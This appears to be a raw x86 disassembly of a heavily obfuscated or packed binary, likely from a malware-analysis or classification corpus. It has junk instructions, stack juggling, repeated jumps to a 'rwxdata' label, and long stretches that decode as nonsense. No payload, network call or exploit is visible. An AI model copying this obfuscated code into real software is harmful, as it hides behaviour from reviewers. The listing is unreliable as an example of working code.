sub_101151da
push [ edi ]
pop [ esp + 0x24 ]
cmc
cmc
mov [ esp ] sp
cmp edi ebx
push [ esp ]
lea esp [ esp + 0x28 ]
ja rwxdata
clc
pushfd
clc
call sub_102010f5
rcl edi 0xe7
nop
iretd
xor al bl
call sub_10144684
pushfd
push 0x5469ef26
mov [ esp + 0x4 ] 0x72acaa9
pushfd
mov [ esp + 0x4 ] edi
call sub_1011762c
test [ ebx ] edx
stosd [ edi ]
sbb esp ebx
dec ebp
mov eax 0x2cd92bc9
cmp eax 0x2fc6b550
dec ebx
jge rwxdata
push ecx
dec esi
pop edi
xchg edx eax
int3
sbb al 0xe7
ja rwxdata
leave
sub ebx ecx
sub al 0x3d
push eax
mov ch 0xc6
das
shr al 0x1
xchg esi eax
mov [ ecx ] edi
push 0xfb6
scasd [ edi ]
pop ebx
test dh dh
imul edx [ edx - 0x72522d34 ] 0x69da65f1
xor eax 0x8d713e00
loope rwxdata
jmp 0x7d52dc6e
push 0xffffff91
xor ebx [ eax + edi * 2 + 0x47 ]
sub_101153b8
jmp rwxdata
mov [ esp ] eax
push eax
push ebp
not al
push 0x5109f9c1
lodsb [ esi ]
call sub_10118fea
xor dl 0xac
jns rwxdata
idiv dh
inc esi
stc
sbb ah [ 0x47be0679 ]
0xe254
in al 0x1a
pop ebx
std
pushad
movsb [ edi ] [ esi ]
movsb [ edi ] [ esi ]
imul ebp esi
pop ss
test al 0xf7
out dx eax
out dx eax
hlt
sub_10115727
mov esi [ ebp + 0xc ]
pushfd
call j_sub_1011ee26
cmp ebx [ ebp + 0x61 ]
test [ ecx + 0x4fa2617e ] 0xf
xchg ebp eax
mov [ 0xffffffffc95eea29 ] eax
adc eax 0x518d1589
loop rwxdata
dec esi
pop eax
xlat
fdiv st7
test eax 0x62330bd9
pop esp
mov al 0x66
inc ecx
push es
cmp [ edx + 0x1d ] esp
cmc
pop ebp
push edx
xor eax 0x6845c009
popfd
push 0x6cb317d6
dec eax
fmul st7
mov dh 0x2b
test eax 0xba536b16
inc esp
cmp [ ebp + 0x61 ] eax
jge rwxdata
test eax 0x8ac935d5
mov ch 0x7d
shl [ eax ] 0xd5
xchg esi eax
mov esi 0xf25b4bfc
xor dh ah
jg rwxdata
stosb [ edi ]
or [ esi + 0x31 ] ecx
xchg ecx eax
sub eax 0x69675668
imul esi [ esi ] 0xc2fcd977
push ss
mov ebx es
lodsd [ esi ]
sub_101159a3
mov [ esp ] 0xf2f0
mov [ esp ] ch
call sub_1011e10c
add [ eax ] al
dec esp
outsd
arpl [ ecx + 0x6c ] sp
inc ecx
insb
insb
outsd
arpl [ eax ] ax
pop edi
pushfd
pop edi
lea esi [ esi + edx + 0x1c ]
bswap di
push 0x67ac3434
mov edi [ ebp + 0x8 ]
push [ esp ]
lea esp [ esp + 0x8 ]
call sub_1011ec0a
call sub_10201ef0
sub_101159e1
pushad
xor cx di
mov ecx [ ebp - 0x8 ]
mov [ esp + 0xc ] 0x8f16e632
sar si 0x5
sar si 0x7
movsx di cl
add ecx [ ebp - 0x4 ]
and di sp
rcl di 0x8
shr ecx 0x1
not di
shl edi 0x15
shl edi cl
dec di
mov edi [ ebx + ecx * 4 ]
bswap esi
btc si sp
clc
add edi eax
pushad
call sub_1011dfcc
call sub_1011e8f7
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_10115a40
pop eax
mov [ edi - 0x1 ] 0x0
pushad
push [ esp ]
seto ah
bswap ax
mov [ esp + 0x20 ] ebx
bswap ax
bswap eax
pushfd
not al
lea eax [ rwxdata ]
lea esp [ esp + 0x24 ]
call sub_1014c566
mov edx 0xf8e6bc23
loop rwxdata
shl edi cl
dec di
mov edi [ ebx + ecx * 4 ]
bswap esi
btc si sp
clc
add edi eax
pushad
call sub_1011dfcc
call sub_1011e8f7
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
and ecx [ edx ]
mov edi 0x97a883c5
das
iretd
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_10115d84
pushad
lea esp [ esp + 0x30 ]
ja rwxdata
push edi
pushad
call sub_10201207
stc
stc
imul edx edx 0xa
call sub_101159a3
shl [ ebx ] cl
in al dx
adc cl [ ebp + 0x9a695c9 ]
pop esp
sub_1011616c
lea esp [ esp + 0x4 ]
je rwxdata
pushad
or bh al
setbe bl
mov bx [ esi ]
mov [ esp ] 0x42fc
and ebx 0xfff
pushad
cmp al ah
add [ ebx + edi ] ax
push 0xfbdac584
push [ esp ]
pushfd
pushfd
lea esp [ esp + 0x50 ]
jmp rwxdata
pushad
jmp rwxdata
jmp rwxdata
call sub_102060ba
add esi 0x2
jmp rwxdata
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_1011617c
mov [ esp ] ah
dec bl
inc ecx
pushad
pushfd
inc bl
inc ecx
inc bl
sbb bl ah
not bl
xchg ebp eax
cwde
mov eax ebp
jmp rwxdata
mov bl 0x1
call j_sub_1014723b
and bl [ cs : esi + edx * 8 + 0x68 ]
mov [ 0xdd1b05c ] al
aas
sub al 0x90
inc eax
or [ esi ] al
cdq
pop eax
getsec
jl rwxdata
imul ecx [ ecx ] 0xffffffb5
or eax 0xc866552a
fisub [ eax ]
je rwxdata

mov ch 0x9a
loop rwxdata
lodsd [ esi ]
sbb [ ebp - 0x7bbcc38e ] 0xe6
jne rwxdata
aam 0xf2
0xe1df
dec ebx
je rwxdata
aad 0x30
lea eax [ edi ]
cmp bl bh
retn 0xe8f7

loop rwxdata
pop ebp
inc ecx
cmp eax 0xa5d54981
fstp [ edx + 0x5 ]
jne rwxdata
fild [ ebx - 0x52631c6c ]
sub_101162d3
lea esp [ esp + 0x58 ]
ja rwxdata
jae rwxdata
jmp rwxdata
push 0xf5564d03
cmp ecx [ ebp - 0x4 ]
call sub_1014be53
call sub_10201415
push ecx
mov ah 0x6b
lahf
pop edi
xor [ edi - 0x138e0760 ] cl
dec eax
add [ ebx + 0xc ] dh
scasb [ edi ]
jo rwxdata
stc
cmp ecx [ ebp - 0x4 ]
push ebp
call sub_10204bf9
mov dh 0x97
enter 0xa41b 0x4d
mov eax 0x497d460c
fsubr [ eax + ebx * 8 + 0x67 ]
in al dx
push ebx
mov ebx 0xff7f6063
mov edi 0x9c42603f
stosd [ edi ]
aam 0x2c
0x26f9e894 0x86c1
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
pop es
adc al 0xb5
enter 0xc01e 0xb7
clc
call sub_1014720b
cmp al 0x9
jmp rwxdata
test cx 0xf04c
cmp [ edi - 0x1 ] 0x0
call sub_101fcf0b
mov esi 0xcc72c01f
xchg [ eax + 0x711e01c9 ] edi
fcom st2
outsb
fcmovu st1
in eax 0xb6
leave
sbb ah [ ebp - 0x41b899c8 ]
or dh dh
int3
scasd [ edi ]
mov eax 0x9e830ee4
xchg esp ecx
mov dh 0x98
pop edi
pop esi
enter 0xc63 0x54
das
cmpsb [ esi ] [ edi ]
sar [ ebx + 0x144e5b7 ] cl
aaa
inc edi
mov [ 0xffffffff85b3a7b5 ] al
0x606d
sbb bl [ ecx - 0x7b ]
aaa
dec esp
dec ebx
push esp
outsd
jo rwxdata
mov [ esp + 0x8 ] 0x5b
push [ esp + 0x4 ]
lea esp [ esp + 0x10 ]
ja rwxdata
test al 0x22
cld
push ss
dec eax
xor cl [ esi + esi * 2 + 0x48 ]
xchg ebp eax
or [ edx + 0x2d ] esi
xchg edx eax
or eax 0x30affd22
test edx eax
jl rwxdata
cmp eax 0xb7c01ec8
test esp esi
push ecx
in eax dx
inc ecx
les ecx [ edi + 0x6b03823c ]
xor al 0x9b
stosd [ edi ]
jle rwxdata
push edi
pushad
call sub_10201207
pushfd
bt ebx ebx
stc
imul edx edx 0xa
clc
cmc
add edx eax
push [ esp ]
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
mov ch 0x71
pop ebx
in eax dx
pop edi
xor [ ebx ] bl
jecxz rwxdata
fdiv st3
sub al 0x81

inc edi
pop eax
mov es cx
or dh [ esp + edx * 4 - 0x4aebf804 ]
jmp rwxdata
jpo rwxdata
btc ebx ebx
pushfd
mov ebx eax
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
xor ch dl
jle rwxdata
cmp [ ecx - 0x6b ] cl
scasb [ edi ]
popfd
out dx eax
push 0x37
xchg ecx eax
pushfd
mov edi 0x29ad9c83
push ds
ror [ 0x42f0b25e ] 0x1
push es
sub [ 0x59851302 ] edi
fisubr [ ecx - 0xd ]
add eax 0x44b5921b
0xc7029d85 0x4b73
clc
cmp al 0xaf
cmp [ edi ] 0x23
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
xchg edi eax
add [ ebx ] 0x2f
scasd [ edi ]
cmp al 0x8f

xchg ebx eax
loope rwxdata
push cs
mov dl 0x6c
mov ebx 0x39e45bec
loopne rwxdata
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
sar ax 0xd
bts ax 0x1
sub edx edx
movsx ax bl
daa
sbb ax dx
aas
mov eax edx
dec al
test bl 0xe2
or al cl
add edi 0x1
and al 0x5f
adc al 0xd7
mov al [ edi ]
cmp eax edx
test al al
jmp rwxdata
les edi [ edx - 0x5f50611f ]
mov dl 0x1e
fiadd [ ecx + 0x22ea95aa ]
xchg dl ch
xchg esp eax
jmp 0xffffffff9c0c8ab9
inc [ edi - 0x68 ]
sbb eax esp
mov edx 0xcc1e7f74
jg rwxdata
inc edi
cwde
je rwxdata
retn 0xc391
sti
dec eax
xchg ebp eax
mov edx 0x838ad5a5
jpo rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
stc
jmp rwxdata
clc
stc
sub al 0x30
call sub_1014781a
sub_101162e2
pushad
cmp al 0x5a
pushad
lea esp [ esp + 0x40 ]
ja rwxdata
inc ah
ror ah cl
mov ah [ esi ]
stc
cmp bl cl
cmp ah 0x41
pushfd
mov [ esp ] 0xea21
push ebp
lea esp [ esp + 0x8 ]
jb rwxdata
sub ah 0x4d
add al 0x20
push esp
cmc
mov [ esp ] 0xd5ce
test dl bl
or al al
call sub_102000c8
movsx si al
mov esi [ ebp + 0xc ]
jmp sub_10201df6
bt dx 0xb
push 0x5466910a
cmp ah 0x5a
jmp rwxdata
mov [ esp ] di
lea esp [ esp + 0x4 ]
ja rwxdata
bt cx 0xd
test ch 0x9a
jmp sub_101444e1
sub_10116553
cmp eax 0x7f
pushfd
pushfd
lea esp [ esp + 0x10 ]
ja rwxdata
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
sub_1011658d
movzx edi dl
bswap di
mov [ esp + 0x4 ] ebp
lea esi [ esi + edx + 0x1c ]
movzx di bl
movsx di bl
mov edi [ ebp + 0x8 ]
push edx
push [ esp + 0x4 ]
call sub_102055d2
jmp rwxdata
pushfd
pushfd
lea esp [ esp + 0x8 ]
jb rwxdata
clc
call sub_1014720b
cmp al 0x9
jmp rwxdata
cmc
cmp cl cl
cmp [ edi - 0x1 ] 0x0
jmp rwxdata
mov [ esp + 0x8 ] 0x5b
push [ esp + 0x4 ]
lea esp [ esp + 0x10 ]
ja rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
push edi
pushad
call sub_10201207
pushfd
bt ebx ebx
stc
imul edx edx 0xa
clc
cmc
add edx eax
push [ esp ]
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
call sub_101153b8
add di cx
xor di si
mov edi [ edx + 0x24 ]
pushfd
mov [ esp ] dh
push esp
add edi eax
bt esi esp
call sub_101466a1
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_101165e5
pushfd
bt dx 0x6
cmp dh 0x2e
xor al 0x72
push [ esp + 0x14 ]
bt bp di
rol al 0x6
cmp bl 0xc3
stc
bt di sp
not al
clc
cmp bl dl
mov [ esp ] 0x77
cmc
add al 0xc7
bt ebp eax
cmp al [ edi ]
pushfd
setae al
call sub_101189ce
cld
in al 0x1a
ror [ esi + 0x74 ] 0x1
dec edx
pop ebx
push eax
or ecx [ edx - 0x8f14473 ]
out dx eax
out dx eax
out dx eax
dec edi
mov bl 0xab
out 0x58 eax
fisub [ eax + 0x15ca3d82 ]
stosb [ edi ]
cmc
sbb [ 0xffffffffa9b54d31 ] eax
popad
popfd
jo rwxdata
insb
cmp edi ebx
pushfd
push 0xf9938d36
push [ esp ]
call sub_10145e96
loop rwxdata
pop ebx
mov [ 0x37bd4ae4 ] eax
sub ch [ edx ]
out 0xd7 eax
call 0xffffffffdca4ea9f
stosd [ edi ]
mov ah 0x1e
popfd
in eax dx
nop
out dx eax
inc ebx
rwxdata
xchg ecx eax
sbb [ esi + 0x21 ] edi
xlat
daa
push 0x40aef1e1
dec ecx
fld st3
ja rwxdata
movsb [ edi ] [ esi ]
sbb bl [ ebx + 0x47 ]
cwde
sti
mov eax 0xcf4fbf5f
test al 0xd9
sbb [ esi ] 0xd1adadec
pop ebp
shr [ eax ] 0xb6
add [ edi - 0xa963f42 ] bh
ror [ 0xffffffffe9b5ec52 ] cl
xchg ecx eax
into
mov eax [ 0x217e1991 ]
int 0x76
dec esp
aas
push ss
sbb esp [ edx ]
or bh [ 0xffffffffae5051d7 ]
add dl [ ecx + 0xe ]
int3
sub_10116dfb
mov esp esi
pushfd
pushad
push ecx
mov [ esp ] si
lea esp [ esp + 0x28 ]
jmp rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10116e0d
pushfd
jmp rwxdata
lea esp [ esp + 0x28 ]
je rwxdata
bswap bx
pop ebx
lea edi [ eax - 0x4ca17c7c ]
pop edi
xchg si bp
pushad
jmp rwxdata
push ebx
mov [ esp ] 0xe8
adc ecx ecx
push [ esp ]
pushfd
pushad
mov [ esp + 0x4 ] dh
lea esp [ esp + 0x2c ]
jmp rwxdata
mov esi [ esp + 0x20 ]
push 0x8767430c
push [ esp + 0x4 ]
pushfd
pushfd
mov ebp [ esp + 0x34 ]
push [ esp ]
pushfd
pushfd
push [ esp + 0x44 ]
retn 0x50
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
sub_10116e13
lea esp [ esp + 0x10 ]
je rwxdata
pushad
cmp ah 0xe6
lea esp [ esp + 0x20 ]
js rwxdata
pushad
push esi
cmp al ah
pushad
call sub_101463c8
pushad
pushad
push [ esp + 0x4 ]
or ah ah
jmp rwxdata
or ah ah
pushfd
lea esp [ esp + 0x4 ]
jle rwxdata
call sub_10204f8b
retn 0xf846
jmp sub_10144eab
push eax
lea esp [ esp + 0x4 ]
je rwxdata
pushfd
call sub_102055eb
stc
pushfd
add esp ebx
sti
pop edi
aas
add [ esi - 0x1f975431 ] 0xe9
sbb al 0x5b
add al 0xd6
test eax 0xbe806e10
xchg ebp eax
stosb [ edi ]
int 0x92
sub dh dh
in eax 0x3a
sbb al 0x42
pop esp
inc edx
pop esp
inc edx
jge rwxdata
push 0xd4c6fbc9
cmp ah 0x2e
lea esp [ esp + 0x4 ]
pop ebx
jle rwxdata
jo rwxdata
cwde
int3
cmpsb [ esi ] [ edi ]
cmp esi ecx
adc edx edi
test eax 0x1f49a115
aad 0x3
inc eax
xchg esp eax
sub ch [ ebx - 0x58 ]
mov bh 0x43
pop ecx
sub ch [ ebx + esi * 4 ]

sub_10116e27
lea esp [ esp + 0x2c ]
je rwxdata
pushad
pushad
push 0xe0896687
mov [ ebp - 0x8 ] ecx
push ecx
pushfd
pushfd
lea esp [ esp + 0x50 ]
jmp rwxdata
mov [ ebp - 0x8 ] ecx
pushfd
push 0x3d387310
pushfd
pushad
lea esp [ esp + 0x2c ]
jmp rwxdata
call sub_101159e1
pushad
lea esp [ esp + 0x44 ]
je rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
bt bx 0xe
push ebx
sub al 0x30
call sub_1015a2e8
mov ecx 0xa49ad727
salc
test al 0xb9
cld
pop eax
das
sbb [ ebx ] ebp
adc al 0x8a
adc al 0x28
sbb [ gs : ebp + 0x69 ] ebp
fimul [ esi ]
mov cl 0x19
cmc
adc [ edx + ebx - 0x5b ] ah
std
stc
sub_10116e45
call sub_1020b7b5
imul esp edx 0x7d
inc edx
pop ebp
ror [ ebp - 0x72 ] cl
jno rwxdata
push edi
cld
jno rwxdata
xor al 0x4
add [ ecx + 0x689cf84d ] cl
adc [ ebx + 0x38 ] dh
cmp eax 0x648d609c
and al 0x2c
jmp rwxdata
push edi
pop es
inc ebx
pop ebx
call sub_101159e1
pushad
lea esp [ esp + 0x44 ]
je rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
bt bx 0xe
push ebx
sub al 0x30
call sub_1015a2e8
mov ecx 0xa49ad727
salc
test al 0xb9
cld
pop eax
das
sbb [ ebx ] ebp
adc al 0x8a
adc al 0x28
sbb [ gs : ebp + 0x69 ] ebp
fimul [ esi ]
mov cl 0x19
cmc
adc [ edx + ebx - 0x5b ] ah
std
stc
sub_1011701f
cmp ah 0x5
push edi
mov [ esp + 0x8 ] 0xddd
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
push eax
push [ esp ]
push [ esp ]
mov [ esp + 0x4 ] ch
cmp eax 0x7f
call sub_1015a640
add [ edx - 0x728a9563 ] 0xffffffd1
loop rwxdata
push edi
ror [ edi + ecx - 0x24 ] 0x1
sub esi esp
xor eax 0x62dc4c37
mov [ 0x7629e407 ] eax
or dh cl
mov esp 0xf543aab6
sbb dh bh
adc [ esi + 0x32ccd9c8 ] 0x59
push esi
shr [ esi - 0x51 ] 0x1
or dl ch
dec esp
lds ebp [ eax - 0x413e34ae ]
cdq
out 0x88 al
test [ eax ] 0xcf6746d9
mov eax 0xc9d6da19
nop
into
ja rwxdata
or ebp ebp
test [ ecx + 0x1f ] bh
cmp esp ebx
mov [ 0x43ef6ffa ] al
stosb [ edi ]
popfd
shr [ ebp - 0x6fb0af7e ] 0x1
std
and [ edx ] 0x5ae09f13
jge rwxdata
loopne rwxdata
out 0x4d al
mul [ edx ]
dec esi
salc
je rwxdata
pushfd
push [ esp ]
lea esp [ esp + 0x30 ]
jae rwxdata
in al dx
shr al 0x3
mov eax edx
and al ch
pushad
sub al 0x26
and al bh
add edi 0x1
jmp rwxdata
add al ch
xor eax 0x82830004
popfd
push 0x75
sbb eax 0xdbee2058
inc eax
or esi [ ebp + 0x7984ed09 ]
pop ds
cmp cl 0x50
mov al [ edi ]
mov [ esp ] bl
test al al
mov [ esp ] 0xc
call sub_102091cd
sub_1011745f
adc al al
push edx
pushad
mov [ esp ] dl
lea esp [ esp + 0x2c ]
jae rwxdata
pushad
pushfd
push [ esp ]
push edi
lea esp [ esp + 0x2c ]
call sub_101ffc63
call sub_10209cf2
cmp ebx [ edx + 0x45 ]
out dx al
jno rwxdata
call j_sub_10201dfb
clc
mov [ esp ] 0xdc
cmp al 0xb4
or eax eax
call sub_10117d49
pop eax
mov [ edi ] 0x3f
[ ebx + 0x2e796453 ]
popad
mov [ 0x5da63227 ] al
fmul [ esi ]
jmp rwxdata
cmpsb [ esi ] [ edi ]
pop ebp
stosb [ edi ]
jne rwxdata
mov cl 0xa8
mov dh 0xe8
xchg edi eax
jbe rwxdata
mov dl 0xcc
mov ah 0x1b
sbb ah bl
push ds
cmpsd [ esi ] [ edi ]
insb
les edx [ edi - 0x5ba0f3df ]
fmul [ esi ]
jpe rwxdata
xor [ esi ] cl
pop ds
inc esi
stc
and eax 0x5ecfc5f8
mov [ esi - 0x27849729 ] dl
fxch st5
nop
mov ds [ edi + 0x57e861a1 ]
lodsb [ esi ]
rcr [ ecx + 0x25 ] 0x4c
push edx
inc al
ror ch cl
sbb al 0xc2
dec eax
xchg edi eax
sub_10117483
lea esp [ esp + 0x4 ]
jne rwxdata
push edi
pushad
call sub_10201207
movzx ax bl
mov [ edi - 0x1 ] 0x0
setl al
push ebx
call sub_1014bbc5
adc bl [ edx ]
inc esp
jg rwxdata
push es
or [ esi ] dl
popad
push cs
mov al 0xc1
shl [ esi + 0x2b0a3e1f ] cl
mov bl 0xdf
push edx
adc ebp [ ebx + 0x22 ]
pop esp
popfd
push edi
enter 0xb4d9 0xca
sub_1011762c
pushfd
mov [ esp + 0xc ] 0x12ce78b9
mov [ esp + 0x4 ] 0xff
lea esp [ esp + 0xc ]
jmp rwxdata
jmp rwxdata
pushfd
pushfd
mov [ esp + 0x4 ] edx
push [ esp ]
push 0x278841c6
pushfd
lea esp [ esp + 0x10 ]
jmp sub_1020d32f
sub_1011770d
sub al 0x30
bt ecx 0x14
clc
cmp al 0x9
push [ esp ]
lea esp [ esp + 0x8 ]
ja rwxdata
push edi
pushad
call sub_10201207
push eax
call sub_10145c02
and edi [ ebp + 0x59491541 ]
test [ esi - 0xf622060 ] edx
sub_10117d49
pushad
push 0x1c9a2d0b
pushfd
lea esp [ esp + 0x30 ]
je rwxdata
pushad
stc
stc
xor eax eax
add esp 0x20
pushad
pushad
or ebx ebx
push 0xf46ea48a
push [ esp + 0x8 ]
lea esp [ esp + 0x48 ]
je rwxdata
movzx ebx bl
mov ebx eax
cwde
lea eax [ ebp - 0x8 ]
pushad
mov [ esp + 0x1c ] eax
push esi
pushad
push [ ebp - 0x4 ]
pop [ esp + 0x3c ]
lahf
lea esp [ esp + 0x3c ]
jg rwxdata
pushad
mov bh 0xa6
mov edi [ esp + 0x20 ]
jmp sub_10144c23
movzx si al
mov esi eax
movsx ax al
bswap ax
pushad
mov [ esp + 0x1c ] ebx
push [ esp + 0x4 ]
not ax
pushfd
lea eax [ LocalFree@IAT ]
jmp rwxdata
pushfd
mov [ esp ] ebx
setge ah
cwde
not ax
push 0xb
mov ax bp
lea eax [ ecx * 2 + 0x27764e06 ]
cwde
lea eax [ rwxdata ]
jmp rwxdata
movzx eax dl
push ebx
jmp rwxdata
pushad
call sub_102091f3
les esi [ eax - 0x54c3412 ]
or ebx [ esp + esi * 4 ]
inc eax
xchg ebx eax
int3
pushfd
mov [ esp ] rwxdata
jmp rwxdata
not eax
call sub_10147e35
jmp rwxdata
pushfd
push [ eax ]
pop [ esp ]
push ecx
push 0x82d544ec
push [ esp ]
push [ esp + 0xc ]
retn 0x10
sub_10117f5e
cmp ah 0x5
push 0x5dc7c7d7
call sub_101fcba6
pushad
cmp ah 0xe6
lea esp [ esp + 0x20 ]
js rwxdata
pushad
pushad
push [ esp + 0x4 ]
or ah ah
jmp rwxdata
or ah ah
pushfd
lea esp [ esp + 0x4 ]
jle rwxdata
call sub_10204f8b
retn 0xf846
jmp sub_10144eab
push eax
lea esp [ esp + 0x4 ]
je rwxdata
pushfd
call sub_102055eb
stc
pushfd
add esp ebx
sti
pop edi
aas
add [ esi - 0x1f975431 ] 0xe9
sbb al 0x5b
add al 0xd6
